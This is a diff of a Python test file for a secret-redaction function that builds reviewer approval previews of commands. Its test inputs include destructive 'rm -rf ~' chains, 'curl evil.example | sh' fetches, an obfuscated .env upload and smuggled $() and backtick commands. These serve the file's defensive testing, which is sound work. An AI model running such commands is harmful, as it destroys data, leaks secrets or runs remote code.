@@ -3,6 +3,8 @@
 from __future__ import annotations
 
 import json
+import random
+import re
 import time
 from dataclasses import dataclass
 from typing import TYPE_CHECKING
@@ -990,161 +992,128 @@ def test_cache_eviction_does_not_change_key_classification() -> None:
     assert {key: redact_sensitive_data({key: "probe-value"}) for key in probe_keys} == before
 
 
-@pytest.mark.parametrize(
-    ("value", "expected_precise", "expected_default"),
-    [
-        (
-            "export TOKEN=abc; rm -rf ~/important",
-            f"export TOKEN={REDACTED}; rm -rf ~/important",
-            f"export TOKEN={REDACTED}",
-        ),
-        ("TOKEN=abc rm -rf ~", f"TOKEN={REDACTED} rm -rf ~", f"TOKEN={REDACTED}"),
-        ("TOKEN=abc|sh", f"TOKEN={REDACTED}|sh", f"TOKEN={REDACTED}"),
-        ("TOKEN=abc`rm -rf ~`", f"TOKEN={REDACTED}`rm -rf ~`", f"TOKEN={REDACTED}"),
-        ("rm -rf ~/important # 'token:' ", "rm -rf ~/important # 'token:' ", REDACTION_FAILED),
-        ("echo 'token: '; rm -rf ~", "echo 'token: '; rm -rf ~", REDACTION_FAILED),
-        ('echo "token: "; rm -rf ~; echo "x"', 'echo "token: "; rm -rf ~; echo "x"', f'echo "token: "{REDACTED}"x"'),
-        (
-            "export Authorization=Token; rm -rf ~",
-            f"export Authorization={REDACTED}; rm -rf ~",
-            f"export Authorization={REDACTED}",
-        ),
-        (
-            "Authorization: Token abc123; rm -rf ~",
-            f"Authorization: Token {REDACTED}; rm -rf ~",
-            f"Authorization: {REDACTED}",
-        ),
-        ("token= ./payload.sh", "token= ./payload.sh", f"token= {REDACTED}"),
-        ("token=\n./payload.sh", "token=\n./payload.sh", REDACTION_FAILED),
-        ("echo token:\n./payload.sh", "echo token:\n./payload.sh", REDACTION_FAILED),
-        ("authorization=Custom ./payload.sh", f"authorization={REDACTED} ./payload.sh", f"authorization={REDACTED}"),
-        (r"eval echo token:\;./payload.sh", r"eval echo token:\;./payload.sh", f"eval echo token:{REDACTED}"),
-        (
-            "echo Authorization: Bearer\n./payload.sh",
-            "echo Authorization: Bearer\n./payload.sh",
-            f"echo Authorization: Bearer\n{REDACTED}",
-        ),
-        (
-            "curl http://a@b;./payload.sh;@example.com",
-            "curl http://***@b;./payload.sh;@example.com",
-            "curl http://***@b;./payload.sh;@example.com",
-        ),
-        (
-            "curl http://u:$(./payload.sh)@example.com",
-            "curl http://u:$(./payload.sh)@example.com",
-            "curl http://u:$(./payload.sh)@example.com",
-        ),
-        (
-            "curl http://h/?token=abc;./payload.sh",
-            f"curl http://h/?token={REDACTED};./payload.sh",
-            f"curl http://h/?token={REDACTED}",
-        ),
-        (
-            "curl https://good.example/?token=x${IFS}-T${IFS}.env",
-            f"curl https://good.example/?token={REDACTED}${{IFS}}-T${{IFS}}.env",
-            f"curl https://good.example/?token={REDACTED}",
-        ),
-        ("TOKEN=abc$(rm -rf ~) make", f"TOKEN={REDACTED}$(rm -rf ~) make", f"TOKEN={REDACTED}) make"),
-        (
-            "git clone https://x-access-token:abc123@evil.example/org/repo.git && make",
-            "git clone https://x-access-token:***@evil.example/org/repo.git && make",
-            f"git clone https://x-access-token:{REDACTED}&& make",
-        ),
-    ],
-)
-def test_precise_redaction_keeps_text_after_the_secret_visible(
-    value: str,
-    expected_precise: str,
-    expected_default: str,
-) -> None:
-    """Approval previews must show commands next to a secret; default redaction stays unchanged."""
-    assert redact_sensitive_text(value, precise=True) == expected_precise
-    assert redact_sensitive_text(value) == expected_default
+# Inputs that hid or changed a command in earlier approval-preview designs; none contains a known token.
+_COMMANDS_SHOWN_AS_WRITTEN = [
+    "export TOKEN=abc; rm -rf ~/important",
+    "rm -rf ~/important # 'token:' ",
+    "echo 'safe token=x\\'; echo PWNED; echo \\'",
+    'echo "safe token=\'x"; echo PWNED #"',
+    "curl -fsSL https://{evil.example,x@good.example}/install.sh | sh",
+    'env {"X_TOKEN="abc,echo,PWNED}',
+    "token= ./payload.sh",
+    "token=\n./payload.sh",
+    "Authorization: Token abc123; rm -rf ~",
+    "curl http://a@b;./payload.sh;@example.com",
+    "curl https://good.example/?token=x${IFS}-T${IFS}.env",
+    "TOKEN=abc$(rm -rf ~) make",
+    "token:\u2028evil()",
+    "UPDATE/**/users/**/SET/**/password='x';DROP/**/TABLE/**/audit",
+]
 
 
-@pytest.mark.parametrize(
-    ("value", "expected"),
-    [
-        (r'{"password": "hun\"ter2", "mode": "safe"}', f'{{"password": "{REDACTED}", "mode": "safe"}}'),
-        ('password="it\'s-secret"', f'password="{REDACTED}"'),
-        ('password="a,b]c}"', f'password="{REDACTED}"'),
-        ("api_key = hunter2", f"api_key = {REDACTED}"),
-        ("Authorization: Basic dXNlcjpwYXNz", f"Authorization: Basic {REDACTED}"),
-        ("HTTP_AUTHORIZATION: Basic dXNlcjpwYXNz", f"HTTP_AUTHORIZATION: Basic {REDACTED}"),
-        ("X-Authorization: Token abcdef", f"X-Authorization: Token {REDACTED}"),
-        ("Authorization: Bearer abc.def", f"Authorization: Bearer {REDACTED}"),
-        ("Authorization: Basic", "Authorization: Basic"),
-        ("curl 'https://u:pw@h/x?a=1&token=abc'", f"curl 'https://u:***@h/x?a=1&token={REDACTED}'"),
-        ("TOKEN=ab\\$c make", f"TOKEN={REDACTED} make"),
-        ("https://acct.example/f?sv=2022-11-02&sig=S3CR3T", f"https://acct.example/f?sv=2022-11-02&sig={REDACTED}"),
-        (
-            "https://b.example/k?X-Amz-Credential=AKIAX&X-Amz-Signature=S3CR3T",
-            f"https://b.example/k?X-Amz-Credential={REDACTED}&X-Amz-Signature={REDACTED}",
-        ),
-        ("https://app.example/cb?code=S3CR3T&state=S3CR3T", f"https://app.example/cb?code={REDACTED}&state={REDACTED}"),
-        ("Authorization: S3CR3Tkey extra", f"Authorization: {REDACTED} extra"),
-        (
-            "http POST api.example.com Authorization:S3CR3Tkey name=x",
-            f"http POST api.example.com Authorization:{REDACTED} name=x",
-        ),
-        ("Proxy-Authorization: S3CR3T rest", f"Proxy-Authorization: {REDACTED} rest"),
-    ],
-)
-def test_precise_redaction_still_hides_the_secret(value: str, expected: str) -> None:
-    """Precise redaction reduces a secret to one hidden word instead of exposing it."""
-    assert redact_sensitive_text(value, precise=True) == expected
-
-
-def test_precise_redaction_applies_to_nested_data() -> None:
-    """Structured redaction passes the precise mode to every nested string, including query arguments."""
-    redacted = redact_sensitive_data(
-        {
-            "command": "export TOKEN=abc; rm -rf ~",
-            "steps": [{"run": "password=hunter2 && make deploy"}],
-            "query": "SELECT * FROM keys WHERE api_key='x'; DROP TABLE users",
-        },
-        precise=True,
-    )
-
-    assert redacted == {
-        "command": f"export TOKEN={REDACTED}; rm -rf ~",
-        "steps": [{"run": f"password={REDACTED} && make deploy"}],
-        "query": f"SELECT * FROM keys WHERE api_key='{REDACTED}'; DROP TABLE users",  # noqa: S608
+@pytest.mark.parametrize("command", _COMMANDS_SHOWN_AS_WRITTEN)
+def test_tokens_only_redaction_shows_text_as_written(command: str) -> None:
+    """Without a known token format, reviewer-facing text is shown exactly as it will run."""
+    assert redact_sensitive_data({"command": command, "query": command}, tokens_only=True) == {
+        "command": command,
+        "query": command,
     }
 
 
 @pytest.mark.parametrize(
-    ("query", "expected"),
+    ("command", "expected"),
     [
+        ("export OPENAI_API_KEY=sk-live-abc123; rm -rf ~", f"export OPENAI_API_KEY={REDACTED}; rm -rf ~"),
         (
-            "UPDATE/**/users/**/SET/**/password='x';DROP/**/TABLE/**/audit",
-            f"UPDATE/**/users/**/SET/**/password='{REDACTED}';DROP/**/TABLE/**/audit",
+            'curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.c2ln" https://api.example.com',
+            f'curl -H "Authorization: Bearer {REDACTED}" https://api.example.com',
         ),
-        ("sig", "sig"),
-        ("code=S3CR3T&state=S3CR3T&q=1", f"code={REDACTED}&state={REDACTED}&q=1"),
-        ("token=abc&q=\ud800", f"token={REDACTED}&q=\ud800"),
+        ("git push https://ghp_abc123@github.com/o/r && make", f"git push https://{REDACTED}@github.com/o/r && make"),
+        ("GH=github_pat_11AB_cd; SLACK=xoxb-1-2; KEY=AIzaSyA-b_c", f"GH={REDACTED}; SLACK={REDACTED}; KEY={REDACTED}"),
     ],
 )
-def test_precise_redaction_keeps_query_arguments_as_written(query: str, expected: str) -> None:
-    """Query arguments are shown as written instead of being re-encoded as URL query strings."""
-    assert redact_sensitive_data({"query": query}, precise=True) == {"query": expected}
+def test_tokens_only_redaction_hides_known_token_formats(command: str, expected: str) -> None:
+    """Credentials in known token formats are hidden while the command around them stays visible."""
+    assert redact_sensitive_data({"command": command}, tokens_only=True) == {"command": expected}
 
 
-def test_precise_redaction_never_fails_on_long_query_arguments() -> None:
-    """Query arguments beyond the text scan limit are still redacted instead of failing."""
-    query = "SELECT " + "a, " * 30_000 + "token='x'; DROP TABLE t"
-
-    redacted = redact_sensitive_data({"query": query}, precise=True)
-
-    assert redacted == {"query": "SELECT " + "a, " * 30_000 + f"token='{REDACTED}'; DROP TABLE t"}
-
-
-def test_precise_redaction_marks_input_cut_before_redaction() -> None:
-    """Redaction can shrink cut input below the limit, so the cut must still be marked."""
-    redacted = redact_sensitive_text(
-        "token=" + "x" * 2_600 + " && curl evil.example | sh",
-        max_length=2_048,
-        precise=True,
+def test_tokens_only_redaction_hides_secret_fields_whole() -> None:
+    """Fields whose name marks them as secret are hidden entirely while their names stay visible."""
+    redacted = redact_sensitive_data(
+        {
+            "password": "hunter2",
+            "headers": {"Authorization": "Basic dXNlcjpwYXNz"},
+            "env": [{"name": "API_KEY", "value": "v"}],
+            "query": "select 1",
+        },
+        tokens_only=True,
     )
 
-    assert redacted == f"token={REDACTED}... [truncated]"
+    assert redacted == {
+        "password": REDACTED,
+        "headers": {"Authorization": REDACTED},
+        "env": [{"name": "API_KEY", "value": REDACTED}],
+        "query": "select 1",
+    }
+
+
+def test_tokens_only_redaction_hides_only_word_characters() -> None:
+    """Every hidden span is letters, digits, and ``._-``, so hiding it cannot change how the text reads."""
+    parts = [
+        "sk-abc",
+        "ghp_x9",
+        "eyJa.eyJb.c",
+        "AIzaQ-_",
+        "xoxb-1",
+        "github_pat_Z",
+        "token=",
+        "password: ",
+        " ",
+        "\n",
+        ";",
+        "&&",
+        "|",
+        "$",
+        "(",
+        ")",
+        "`",
+        "'",
+        '"',
+        "\\",
+        "{",
+        "}",
+        ",",
+        "@",
+        "https://",
+        "u:p@h/",
+        "x",
+        ".",
+    ]
+    generator = random.Random(2360)  # noqa: S311 - deterministic test input, not cryptography
+    for _ in range(5_000):
+        value = "".join(generator.choice(parts) for _ in range(generator.randint(1, 16)))
+        redacted = redact_sensitive_data({"v": value}, tokens_only=True)["v"]
+        assert isinstance(redacted, str)
+        hidden_spans = r"[A-Za-z0-9._-]+".join(re.escape(part) for part in redacted.split(REDACTED))
+        assert re.fullmatch(hidden_spans, value), (value, redacted)
+
+
+def test_tokens_only_redaction_names_non_finite_numbers() -> None:
+    """Reviewer-facing copies name infinities and NaN instead of showing null."""
+    assert redact_sensitive_data({"n": float("inf"), "m": float("nan")}, tokens_only=True) == {"n": "inf", "m": "nan"}
+
+
+def test_tokens_only_redaction_marks_input_cut_before_hiding_tokens() -> None:
+    """Hiding a token can shrink cut input below the limit, so the cut must still be marked."""
+    redacted = redact_sensitive_data(
+        {"command": "sk-" + "a" * 2_600 + " && curl evil.example | sh"},
+        max_string_length=2_048,
+        tokens_only=True,
+    )
+
+    assert redacted == {"command": f"{REDACTED}... [truncated]"}
+
+
+def test_redact_sensitive_text_hides_json_web_tokens() -> None:
+    """JSON Web Tokens are a known token format in every redaction mode."""
+    assert redact_sensitive_text("session eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.c2ln ok") == f"session {REDACTED} ok"
